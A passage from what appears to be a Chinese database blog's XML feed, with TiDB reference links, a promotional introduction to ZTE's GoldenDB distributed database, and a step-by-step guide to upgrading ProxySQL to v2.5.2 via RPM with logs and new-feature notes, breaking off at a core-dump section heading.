[15]: resource_manager: add metrics for avaiable RU #6523: <a class="link"   href="https://github.com/tikv/pd/pull/6523" >https://github.com/tikv/pd/pull/6523 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[16]: 资源组 (Resource Groups): <a class="link"   href="https://dev.mysql.com/doc/refman/8.0/en/resource-groups.html" >https://dev.mysql.com/doc/refman/8.0/en/resource-groups.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[17]: WL#9467: Resource Groups: <a class="link"   href="https://dev.mysql.com/worklog/task/?id=9467" >https://dev.mysql.com/worklog/task/?id=9467 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[18]: 使用案例: <a class="link"   href="https://asktug.com/t/topic/37127/2?u=shawnyan" >https://asktug.com/t/topic/37127/2?u=shawnyan <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
[19]: #17706: <a class="link"   href="https://github.com/pingcap/tidb/pull/17706" >https://github.com/pingcap/tidb/pull/17706 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>TiDB</category>
        <category>TiDB 7.x</category>
      </categories>
      <tags>
        <tag>tidb</tag>
        <tag>tidb 7.x</tag>
        <tag>tidb server</tag>
        <tag>resource control</tag>
        <tag>tikv</tag>
      </tags>
  </entry>
  <entry>
    <title>GoldenDB 简介</title>
    <url>/2023/other/goldendb-intro/</url>
    <content><![CDATA[<p>GoldenDB是中兴通讯的金融级交易型分布式数据库。是唯一拥有国家政策性银行、国有大行、股份制银行、城商行及大型金融机构、电信运营商核心业务改造实践的国产数据库。</p>
<img  alt="goldendb-banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230625-3febda2b-dc46-4b4b-8cef-ef4a2dc0536a.png"
                      referrerpolicy="no-referrer"
                >
<p>由中兴通讯自主研发，具有自主知识产权。GoldenDB采用Shared Nothing的分布式架构，结合分片式存储、分布式事务、多版本控制等技术，实现了高性能、高扩展、高可用、高安全的产品特性。<br>
GoldenDB是中兴通讯自主研发的金融级交易型分布式数据库，具有自主知识产权。从2002年正式开始进入数据库领域，启动数据库的研发开始，到2014年携带金融基因的GoldenDB的出生，一路劈风斩浪，截至到目前，GoldenDB已拥有200+的核心专利。</p>
<p>GoldenDB自诞生以来一直坚持自主创新，2014年面向金融行业首次发布v1.0版本，截至目前已经对外发布了7个版本。特别是今年7月底正式对外发布面向混合交易负载场景的GoldenDB v7.0年度新版本，该版本在HTAP、云原生、工具以及语法兼容等方面实现创新和突破，引领国内分布式数据库产品的发展。该版本配置自主研发分布式SQL引擎，HTAP性能位于行业领先水平，其云原生架构实现快速部署、弹性扩容、资源管控、租户隔离、统一纳管和智能运维，有效降低成本，提升性能。在工具集方面，GoldenDB v7.0提供从业务迁移评估、数据迁移、应用开发到运维管理全流程的配套工具；结合AI算法，让系统具备专家级分析评估能力。</p>
<h2 id="GoldenDB产品技术亮点">GoldenDB产品技术亮点</h2>
<ul>
<li>
<p>分布式事务强一致性：中兴GoldenDB支持强一致性的分布式事务控制，解决了分布式读写、分布式写写并发冲突，保证分布式事务的隔离性，在任何场景下均能确保跨分片事务的数据一致性，满足金融行业最严格的数据一致性要求。</p>
</li>
<li>
<p>性能和容量高扩展性:GoldenDB计算层和数据层都可以横向扩展，满足性能和容量的各种处理需求。系统横向扩展时，性能损耗控制在7%以内，采用GoldenDB能在设备扩展的同时保持性能的线性扩展。 GoldenDB支持可视化动态重分布来实现数据节点的不停机扩容，也支持通过读写分离功能进行系统读能力的线性扩展。</p>
</li>
<li>
<p>高可靠性:GoldenDB采用无单点的集群架构，确保任意节点异常，不影响系统整体服务。支持两地三中心架构，提升业务连续性。①支持同城双活。使用数据节点快同步技术进行主机房与同城备机房的数据实时复制，结合灵活的分组管理技术实现业务安全等级的灵活配置，可在提高系统吞吐效率的同时，实现同城RPO为0，RTO &lt;30s。 ②支持异地灾备。异地机房可实现RPO秒级，同时支持孤岛演练、故障切换等整体集成方案，支持异地数据库数据的最终一致性。</p>
</li>
<li>
<p>数据备份恢复全局一致性:GoldenDB采用单机数据库备份和全局事务快照相结合的方法支持全局一致的数据恢复，确保数据可恢复到全局一致状态。同时支持可视化的全量、增量备份，支持定时和实时备份，支持一键恢复到任意时间点，也支持与IBM TSM和NBU等商用备份工具对接，满足应用需求。</p>
</li>
</ul>
<h2 id="GoldenDB的特点">GoldenDB的特点</h2>
<ul>
<li>彻底解决了事务一致性，数据实时一致性的问题。</li>
<li>拥有自主知识产权。</li>
<li>采用Shared Nothing的分布式架构。</li>
<li>结合分片式存储、分布式事务、多版本控制等技术。</li>
<li>实现了高性能、高扩展、高可用、高安全的产品特性。</li>
</ul>
<h2 id="GoldenDB的典型案例有：">GoldenDB的典型案例有：</h2>
<p>中信银行。GoldenDB是中兴通讯与中信银行于2014年联合研发的金融级交易型分布式数据库，并于2019年和2020年先后成功投产中信银行信用卡核心和总行核心两大核心业务。</p>
<p>国泰君安。GoldenDB为国泰君安提供的新一代核心交易系统即低延时核心交易系统在生产环境中的全栈软硬件适配产品，可满足企业对时延、数据传输、安全可靠性的高标准要求，满足在应对交易执行、实时风控、高速行情、实时清算等多种业务、多场景要求时的稳定高速处理能力。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/653426" >https://www.modb.pro/db/653426 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>GoldenDB</category>
      </categories>
      <tags>
        <tag>goldendb</tag>
        <tag>zte</tag>
        <tag>中兴</tag>
        <tag>分布式数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>ProxySQL v2.5.2 版本升级及新特性速览</title>
    <url>/2023/mysql/proxysql-v2.5.2-new-feature/</url>
    <content><![CDATA[<img  alt="proxysql_banner.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240302-cc9e56b7-9308-480c-9d7a-570eaf5f136e.png"
                      referrerpolicy="no-referrer"
                >
<p>ProxySQL 最新 GA 版本为 v2.5.2, 本文将介绍如何升级 ProxySQL 到最新版本，以及 v2.5.x 都有哪些值得一看的新特性。</p>
<h2 id="ProxySQL-升级最新版本">ProxySQL 升级最新版本</h2>
<p>本地环境安装的版本为 2.4.7-5-gd467cc0，通过 RPM 进行安装，那么升级也将变得简单，可以直接通过 YUM 进行升级。</p>
<p>具体操作如下，</p>
<h3 id="1-下载新包到指定目录">1. 下载新包到指定目录</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/sysown/proxysql/releases/download/v2.5.2/proxysql-2.5.2-1-centos7.x86_64.rpm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span> proxysql-2.5.2-1-centos7.x86_64.rpm; <span class="built_in">sha256sum</span> proxysql-2.5.2-1-centos7.x86_64.rpm</span></span><br><span class="line">proxysql-2.5.2-1-centos7.x86_64.rpm</span><br><span class="line">6f7ecc879864708ac7b62cf05edf31f6785697e1501e389e9a8f0d8fc92da489  proxysql-2.5.2-1-centos7.x86_64.rpm</span><br></pre></td></tr></table></figure></div>
<h3 id="2-停止当前-ProxySQL">2. 停止当前 ProxySQL</h3>
<p>停止proxysql，并查看日志，确认服务已停止。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop proxysql</span><br></pre></td></tr></table></figure></div>
<ul>
<li>日志输出：</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-06-13 17:17:27 ProxySQL_GloVars.cpp:16:term_handler(): [WARNING] Received TERM signal: shutdown in progress...</span><br><span class="line">2023-06-13 17:17:27 [INFO] Starting shutdown...</span><br><span class="line">2023-06-13 17:17:27 [INFO] Shutdown completed!</span><br><span class="line">2023-06-13 17:17:27 [INFO] Exiting...</span><br><span class="line">2023-06-13 17:17:27 [INFO] Shutdown angel process</span><br></pre></td></tr></table></figure></div>
<h3 id="3-安装新版-ProxySQL">3. 安装新版 ProxySQL</h3>
<p>通过yum将下载好的安装包进行安装升级。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo yum install proxysql-2.5.2-1-centos7.x86_64.rpm</span></span><br><span class="line">Loaded plugins: changelog, fastestmirror, product-id, search-disabled-repos, subscription-manager, verify</span><br><span class="line"></span><br><span class="line">This system is not registered with an entitlement server. You can use subscription-manager to register.</span><br><span class="line"></span><br><span class="line">Examining proxysql-2.5.2-1-centos7.x86_64.rpm: proxysql-2.5.2-1.x86_64</span><br><span class="line">Marking proxysql-2.5.2-1-centos7.x86_64.rpm as an update to proxysql-2.4.7-1.x86_64</span><br><span class="line">Resolving Dependencies</span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Running transaction check</span></span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package proxysql.x86_64 0:2.4.7-1 will be updated</span>                                                                               </span><br><span class="line"><span class="meta prompt_">---&gt; </span><span class="language-bash">Package proxysql.x86_64 0:2.5.2-1 will be an update</span>                                                                             </span><br><span class="line"><span class="meta prompt_">--&gt; </span><span class="language-bash">Finished Dependency Resolution</span>                                                                               </span><br><span class="line">                                                                                                                 </span><br><span class="line">Dependencies Resolved                                                                                            </span><br><span class="line">                                                                                                                 </span><br><span class="line">=========================================================================================================================================</span><br><span class="line">Package                                Arch           Version              Repository                                              Size</span><br><span class="line">=========================================================================================================================================</span><br><span class="line">Updating:                                                                                                        </span><br><span class="line">proxysql                               x86_64         2.5.2-1              /proxysql-2.5.2-1-centos7.x86_64                        71 M</span><br><span class="line">                                                                                                                 </span><br><span class="line">Transaction Summary                                                                                              </span><br><span class="line">=========================================================================================================================================</span><br><span class="line">Upgrade  1 Package                                                                                               </span><br><span class="line">                                                                                                                 </span><br><span class="line">Total size: 71 M                                                                                                 </span><br><span class="line">Is this ok [y/d/N]: y                                                                                            </span><br><span class="line">Downloading packages:                                                                                            </span><br><span class="line">Running transaction check                                                                                        </span><br><span class="line">Running transaction test                                                                                         </span><br><span class="line">Transaction test succeeded                                                                                       </span><br><span class="line">Running transaction                                                                                              </span><br><span class="line">  Updating   : proxysql-2.5.2-1.x86_64                                                                                               1/2</span><br><span class="line">  Cleanup    : proxysql-2.4.7-1.x86_64                                                                                               2/2</span><br><span class="line">  Verifying  : proxysql-2.5.2-1.x86_64                                                                                               1/2</span><br><span class="line">  Verifying  : proxysql-2.4.7-1.x86_64                                                                                               2/2</span><br><span class="line">                                                                                                                 </span><br><span class="line">Updated:                                                                                                         </span><br><span class="line">  proxysql.x86_64 0:2.5.2-1           </span><br><span class="line">                                      </span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<h3 id="4-启动-ProxySQL">4. 启动 ProxySQL</h3>
<p>安装成功后，proxysql自动启动，查看服务状态。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systemctl status proxysql</span></span><br><span class="line">* proxysql.service - High Performance Advanced Proxy for MySQL</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/proxysql.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Tue 2023-06-13 17:18:34 JST; 2min 16s ago</span><br><span class="line">  Process: 1920276 ExecStart=/usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf $PROXYSQL_OPTS (code=exited, status=0/SUCCESS)</span><br><span class="line">Main PID: 1920278 (proxysql)</span><br><span class="line">    Tasks: 25</span><br><span class="line">   Memory: 12.3M</span><br><span class="line">   CGroup: /system.slice/proxysql.service</span><br><span class="line">           |-1920278 /usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf</span><br><span class="line">           `-1920279 /usr/bin/proxysql --idle-threads -c /etc/proxysql.cnf</span><br></pre></td></tr></table></figure></div>
<p>查看日志，确认启动正常。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-06-13 17:18:34 [INFO] ProxySQL version 2.5.2-217-g7f727b3</span><br><span class="line">2023-06-13 17:18:34 [INFO] Detected OS: Linux centos7.shawnyan.com 3.10.0-1127.19.1.el7.x86_64 #1 SMP Tue Aug 25 17:23:54 UTC 2020 x86_64</span><br><span class="line">2023-06-13 17:18:34 [INFO] ProxySQL SHA1 checksum: 28c2de2d21c48288b340f5c07e0753d95eca521d</span><br><span class="line">2023-06-13 17:18:34 [INFO] Starting ProxySQL</span><br><span class="line">2023-06-13 17:18:34 [INFO] Successfully started</span><br><span class="line">2023-06-13 17:18:34 [INFO] Angel process started ProxySQL process 1920279</span><br><span class="line">2023-06-13 17:18:34 [INFO] Loaded built-in SQLite3</span><br><span class="line">Standard ProxySQL MySQL Logger rev. 2.5.0421 -- MySQL_Logger.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">Standard ProxySQL Cluster rev. 0.4.0906 -- ProxySQL_Cluster.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">Standard ProxySQL Statistics rev. 1.4.1027 -- ProxySQL_Statistics.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">Standard ProxySQL HTTP Server Handler rev. 1.4.1031 -- ProxySQL_HTTP_Server.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] Using UUID from database: 28a7d839-4b4d-403d-b1e1-1f35f8207714</span><br><span class="line">2023-06-13 17:18:34 [INFO] Computed checksum for &#x27;LOAD ADMIN VARIABLES TO RUNTIME&#x27; was &#x27;0x355C22D42ECC56EC&#x27;, with epoch &#x27;1686644314&#x27;</span><br><span class="line">2023-06-13 17:18:34 [INFO] Switching query logging format from 1 to 2</span><br><span class="line">2023-06-13 17:18:34 [INFO] Computed checksum for &#x27;LOAD MYSQL VARIABLES TO RUNTIME&#x27; was &#x27;0xA8C47DB669B380E4&#x27;, with epoch &#x27;1686644314&#x27;</span><br><span class="line">Standard ProxySQL Admin rev. 2.0.6.0805 -- ProxySQL_Admin.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] ProxySQL SHA1 checksum: 28c2de2d21c48288b340f5c07e0753d95eca521d</span><br><span class="line">Standard MySQL Threads Handler rev. 0.2.0902 -- MySQL_Thread.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">Standard MySQL Authentication rev. 0.2.0902 -- MySQL_Authentication.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] Computed checksum for &#x27;LOAD MYSQL USERS TO RUNTIME&#x27; was &#x27;0x7917CD487C11478F&#x27;, with epoch &#x27;1686644314&#x27;</span><br><span class="line">2023-06-13 17:18:34 [INFO] Dumping mysql_servers_incoming</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname    | port | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 0            | 10000000000 | 3306 | 0         | 1      | 0      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">2023-06-13 17:18:34 [INFO] Dumping mysql_servers LEFT JOIN mysql_servers_incoming</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">| mem_pointer | hostgroup_id | hostname | port |</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">+-------------+--------------+----------+------+</span><br><span class="line">2023-06-13 17:18:34 [INFO] Dumping mysql_servers JOIN mysql_servers_incoming</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| hostgroup_id | hostname    | port | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment | mem_pointer | gtid_port | weight | status | compression | max_connections | max_replication_lag | use_ssl | max_latency_ms | comment |</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">| 0            | 10000000000 | 3306 | 0         | 1      | 0      | 0           | 1000            | 0                   | 0       | 0              |         | 0           | 0         | 1      | 0      | 0           | 1000            | 0                   | 0       | 0              |         |</span><br><span class="line">+--------------+-------------+------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+-------------+-----------+--------+--------+-------------+-----------------+---------------------+---------+----------------+---------+</span><br><span class="line">2023-06-13 17:18:34 [INFO] Creating new server in HG 0 : 10000000000:3306 , gtid_port=0, weight=1, status=0</span><br><span class="line">2023-06-13 17:18:34 [INFO] New mysql_group_replication_hostgroups table</span><br><span class="line">2023-06-13 17:18:34 [INFO] New mysql_galera_hostgroups table</span><br><span class="line">2023-06-13 17:18:34 [INFO] New mysql_aws_aurora_hostgroups table</span><br><span class="line">2023-06-13 17:18:34 [INFO] New mysql_hostgroup_attributes table</span><br><span class="line">2023-06-13 17:18:34 [INFO] Checksum for table mysql_servers is 0x3125ECE8F745478E</span><br><span class="line">2023-06-13 17:18:34 [INFO] Rebuilding &#x27;Hostgroup_Manager_Mapping&#x27; due to checksums change - mysql_servers &#123; old: 0x0, new: 0x3125ECE8F745478E &#125;, mysql_replication_hostgroups &#123; old:0x0, new:0x0 &#125;</span><br><span class="line">2023-06-13 17:18:34 [INFO] MySQL_HostGroups_Manager::commit() locked for 2ms</span><br><span class="line">2023-06-13 17:18:34 [INFO] Computed checksum for &#x27;LOAD PROXYSQL SERVERS TO RUNTIME&#x27; was &#x27;0x0000000000000000&#x27;, with epoch &#x27;1686644314&#x27;</span><br><span class="line">Standard Query Processor rev. 2.0.6.0805 -- Query_Processor.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] Computed checksum for &#x27;LOAD MYSQL QUERY RULES TO RUNTIME&#x27; was &#x27;0x63709E548329ECD5&#x27;, with epoch &#x27;1686644314&#x27;</span><br><span class="line">In memory Standard Query Cache (SQC) rev. 1.2.0905 -- Query_Cache.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] Starting new mysql event log file /var/lib/proxysql/queries.log.00000004</span><br><span class="line">2023-06-13 17:18:34 [INFO] Starting new audit log file /var/lib/proxysql/auditlog.log.00000004</span><br><span class="line">Standard MySQL Monitor (StdMyMon) rev. 2.0.1226 -- MySQL_Monitor.cpp -- Thu May 11 11:05:36 2023</span><br><span class="line">2023-06-13 17:18:34 [INFO] For information about products and services visit: https://proxysql.com/</span><br><span class="line">2023-06-13 17:18:34 [INFO] For online documentation visit: https://proxysql.com/documentation/</span><br><span class="line">2023-06-13 17:18:34 [INFO] For support visit: https://proxysql.com/services/support/</span><br><span class="line">2023-06-13 17:18:34 [INFO] For consultancy visit: https://proxysql.com/services/consulting/</span><br></pre></td></tr></table></figure></div>
<h3 id="5-验证版本">5. 验证版本</h3>
<p>从上述日志中，可以看到版本已经升到 2.5.2-217-g7f727b3，再从管理端口连接proxysql确认。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">prxsql</span></span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 1</span><br><span class="line">Server version: 5.5.30 (ProxySQL Admin Module)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">Admin&gt; </span><span class="language-bash"><span class="keyword">select</span> version();</span></span><br><span class="line">+--------------------+</span><br><span class="line">| version()          |</span><br><span class="line">+--------------------+</span><br><span class="line">| 2.5.2-217-g7f727b3 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.000 sec)</span><br></pre></td></tr></table></figure></div>
<p>到此，proxysql已升级到最新版本 v2.5.2。</p>
<h2 id="ProxySQL-2-5-新特性">ProxySQL 2.5 新特性</h2>
<h3 id="1-mysql-hostgroup-attributes">1. mysql_hostgroup_attributes</h3>
<p>proxysql 增加了一张新系统表 mysql_hostgroup_attributes，<br>
对于不同主机组中的后端服务器版本不同或不同主机组的预期行为不同的场景，该表特别有用。<br>
具体表定义如下：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">Admin<span class="operator">&gt;</span> <span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> mysql_hostgroup_attributes\G</span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">       <span class="keyword">table</span>: mysql_hostgroup_attributes</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">Table</span>: <span class="keyword">CREATE</span> <span class="keyword">TABLE</span> mysql_hostgroup_attributes (</span><br><span class="line">    hostgroup_id <span class="type">INT</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">PRIMARY</span> KEY,</span><br><span class="line">    max_num_online_servers <span class="type">INT</span> <span class="keyword">CHECK</span> (max_num_online_servers<span class="operator">&gt;=</span><span class="number">0</span> <span class="keyword">AND</span> max_num_online_servers <span class="operator">&lt;=</span> <span class="number">1000000</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1000000</span>,</span><br><span class="line">    autocommit <span class="type">INT</span> <span class="keyword">CHECK</span> (autocommit <span class="keyword">IN</span> (<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>)) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">-1</span>,</span><br><span class="line">    free_connections_pct <span class="type">INT</span> <span class="keyword">CHECK</span> (free_connections_pct <span class="operator">&gt;=</span> <span class="number">0</span> <span class="keyword">AND</span> free_connections_pct <span class="operator">&lt;=</span> <span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">10</span>,</span><br><span class="line">    init_connect <span class="type">VARCHAR</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    multiplex <span class="type">INT</span> <span class="keyword">CHECK</span> (multiplex <span class="keyword">IN</span> (<span class="number">0</span>, <span class="number">1</span>)) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1</span>,</span><br><span class="line">    connection_warming <span class="type">INT</span> <span class="keyword">CHECK</span> (connection_warming <span class="keyword">IN</span> (<span class="number">0</span>, <span class="number">1</span>)) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">0</span>,</span><br><span class="line">    throttle_connections_per_sec <span class="type">INT</span> <span class="keyword">CHECK</span> (throttle_connections_per_sec <span class="operator">&gt;=</span> <span class="number">1</span> <span class="keyword">AND</span> throttle_connections_per_sec <span class="operator">&lt;=</span> <span class="number">1000000</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="number">1000000</span>,</span><br><span class="line">    ignore_session_variables <span class="type">VARCHAR</span> <span class="keyword">CHECK</span> (JSON_VALID(ignore_session_variables) <span class="keyword">OR</span> ignore_session_variables <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    comment <span class="type">VARCHAR</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>依据 Release Notes, 目前该表如下几个字段有意义：</p>
<ul>
<li>multiplex: 每个主机组值 HG，该值为特定主机组启用或禁用多路复用。 有关相关全局变量的更多信息，请参见 mysql-multiplexing。</li>
<li>free_connections_pct: 打开的空闲连接占主机组中特定服务器的最大连接总数的百分比。 有关相关全局变量的更多信息，请参见 mysql-free_connections_pct。</li>
<li>throttle_connections_per_sec: 确定每秒可以为特定主机组打开的最大新连接数。 有关相关全局变量的更多信息，请参见 mysql-throttle_connections_per_sec_to_hostgroup。</li>
<li>init_connect: 字符串包含一个或多个SQL语句，以分号分隔，这些语句将由ProxySQL在创建或初始化时对特定主机组中的每个后端连接执行。 有关相关全局变量的更多信息，请参见 mysql-init_connect。</li>
</ul>
<p>其余几个字段是预定义字段，目前尚未实现功能。</p>
<h3 id="2-依赖包升级">2. 依赖包升级</h3>
<p>本次共计13个依赖包的版本得到了升级，分别如下：</p>
<ul>
<li>cityhash</li>
</ul>
<p>CityHash，用于字符串的哈希函数族。CityHash为字符串提供哈希函数。这些函数完全混合了输入位，但不适合加密。</p>
<ul>
<li>clickhouse-cpp</li>
</ul>
<p>ClickHouse 的 C++ 客户端。</p>
<ul>
<li>curl</li>
</ul>
<p>一个命令行工具和库，用于传输数据与URL语法，支持DICT, FILE, FTP, FTPS, GOPHER, gopers, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMTP, SMTPS, TELNET, TFTP, WS和WSS。Libcurl提供了无数强大的特性</p>
<ul>
<li>json</li>
</ul>
<p>JSON (JavaScript Object Notation)是一种轻量级的数据交换格式。 人类很容易读和写。 它很容易被机器解析和生成。 它基于JavaScript编程语言标准ECMA-262第三版(1999年12月)的一个子集。 JSON是一种完全独立于语言的文本格式，但使用C系列语言程序员所熟悉的约定，包括C、c++、c#、Java、JavaScript、Perl、Python和许多其他语言。 这些属性使JSON成为理想的数据交换语言。</p>
<ul>
<li>libconfig</li>
</ul>
<p>用于处理配置文件的C/ c++库</p>
<ul>
<li>libev</li>
</ul>
<p>事件通知库</p>
<ul>
<li>libhttpserver</li>
</ul>
<p>用于创建嵌入式Rest HTTP服务器(以及更多)的c++库</p>
<ul>
<li>libmicrohttpd</li>
</ul>
<p>libmicrohttpd是一个用C编写的GNU库(GNU项目的一部分)，它提供了一个紧凑的API和HTTP 1.1 web服务器的实现(也支持HTTP 1.0)。libmicrohttpd只实现HTTP 1.1协议。主应用程序必须仍然提供内容。</p>
<ul>
<li>lz4</li>
</ul>
<p>LZ4是一种无损压缩算法，每核压缩速度&gt; 500 MB/s，可在多核CPU下扩展。它具有极快的解码器，每核速度可达数GB/s，通常达到多核系统的RAM速度限制。</p>
<ul>
<li>pcre</li>
</ul>
<p>提供类型安全的preg_*替换的PCRE包装库。<br>
这个库为您提供了一种方法来确保preg_*函数不会无声地失败，返回可能无法处理的意外空值。</p>
<ul>
<li>prometheus-cpp</li>
</ul>
<p>Prometheus 客户端库的 C++ 实现。该库旨在为c++服务启用度量驱动开发。它实现了Prometheus数据模型，这是一个强大的抽象，可以在其上收集和公开指标。我们提供了由Prometheus收集指标的可能性，但其他推/拉收集可以作为插件添加。</p>
<ul>
<li>re2</li>
</ul>
<p>RE2是一种快速、安全、线程友好的替代方案，可以回溯PCRE、Perl和Python中使用的正则表达式引擎。它是一个c++库。</p>
<ul>
<li>sqlite3</li>
</ul>
<p>SQLite是一个c语言库，它实现了一个小型、快速、自包含、高可靠性、全功能的SQL数据库引擎。SQLite是世界上使用最多的数据库引擎。</p>
<h3 id="3-core-dump-命令">3. core dump 命令</h3>
